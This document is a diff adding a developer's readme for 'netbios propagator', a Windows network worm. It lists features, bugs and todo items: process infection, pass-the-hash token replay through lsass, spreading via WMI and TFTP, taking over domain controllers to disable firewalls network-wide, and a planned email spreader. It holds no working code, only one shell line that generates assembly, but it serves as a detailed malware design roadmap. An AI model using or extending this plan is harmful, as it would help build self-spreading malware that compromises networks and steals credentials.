@@ -1,0 +1,64 @@
+netbios propagator v0.1
+
+currently installed features:
+	+ worm infects all system processes
+	+ ntpr_builder generates an _output.exe file, which contains the worm DLL. the payload, imbedded into the last 
+		segment of the DLL, can be configured by the builder.
+	+ can download a file from http
+	+ installs itself on a usb drive (obsolete)
+	+ copies itself to a netbios share (obsolete)
+	+ NT 6.0+ Hash replay
+		-> Seems to work (mostly) fine on Vista, 2008, 2008r2 (windows 7)
+		-> Floods network with ICMP packets & determines live hosts from ARP cache
+		-> Replays hash by creating a husk process (cmd.exe), and modifies its security token. (lsass6.c)
+		-> the husk process is injected with a DLL
+		-> DLL attempts to gain access to the remote target machine via WMI
+		-> If all is successful, then:
+			1) DLL creates a firewall rule for UDP/69
+			2) DLL starts local tftpd
+			3) (if the remote machine is vista+) DLL installs tftp client on remote machine
+			4) DLL executes tftpd command
+			5) DLL executes payload
+		-> Configured for run-time token grabbing - if a new token is added by lsasrv, the worm will attempt to use it
+		-> Utilizes bcrypt library for encryption/decryption
+		-> Cycles to next target; if all targets are exhausted, then we check the network again
+	+ NT 5.0 Hash Replay
+		-> DLL searches lsasrv.dll memory space for a cbc function signature
+		-> cbc function is used to decrypt/encrypt tokens
+		-> The replication (tftp) component works the same as in 6.0+
+
+bugs:
+	+ Major bug in NT 6.0+ hash replay - there is a 'random' crash occuring in lsass.exe when the husk component 
+		attempts to contact the remote namespace. I suspect some issue with how the session independent debug 
+		messages are sent (aka some race condition). Happens every now and then, irrelevant of the type of hash being
+		used, target machine, or time run.
+	+ Issue with how the DLL sorts hashes and hash dups in XP/2003, causes crash (but this will be fixed soon)
+	+ Some crashes when infecting system processes
+
+todo:
+	+ This part is pretty much done, but find the DC and target it first
+	+ Create a better netscanner without ICMPSendEchoEx2()
+	+ Improve the netscanner to determine L3 network topology
+	+ Complete winxp/2003 hash replay (current task)
+	+ SMTP/email spreader (.lnk generator), outlook.exe, etc
+	+ make everything x86_64
+
+mos_todo:
+	+ Prioritize DC (properly)
+	+ Fixup WMI:
+		Determine OS
+		Determine if tftp package is installed
+		Wait Until package install is complete
+	+ Fixup scanner (atm bypass)
+	+ Crash occurs after "Finding new target"
+	+ Intermittent crash occurs during WMI namespace association
+	+ Fixup static buffer issue in lsass procedures
+	+ Token prioritization
+	+ If access is established on a DC, drop firewall on whole network and begin infection
+	+ Once we are in DC memory, drop all firewalls and begin mass infection of network
+
+	+ If two users have the same password, we will get a token collision
+	+ Delete the original binary once the DLL is injected into mem
+	+ Verify that the DLL works properly in explorer.exe
+	
+	 COUNTER=93; cat part\ 1.txt | while read -n 1 i; do echo "mov byte [eax + $COUNTER], '$i'"; let COUNTER=COUNTER+1; done
